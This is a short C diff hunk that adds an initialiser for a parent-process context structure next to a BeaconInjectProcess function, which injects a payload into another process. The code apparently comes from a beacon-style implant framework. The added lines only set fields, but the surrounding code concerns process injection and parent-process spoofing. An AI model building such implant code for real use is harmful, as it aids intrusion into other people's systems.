@@ -854,6 +854,13 @@ void CleanupParentProcessContext(PRUN_UNDER_CONTEXT context)
 {
 	CloseHandle(context->handle);
 }
+PRUN_UNDER_CONTEXT ParentProcessContextInit(PRUN_UNDER_CONTEXT	context)
+{
+	context->handle = INVALID_HANDLE_VALUE;
+	context->updateProcessAttributes = UpdateParentProcessContext;
+	context->cleanup = CleanupParentProcessContext;
+	return context;
+}
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
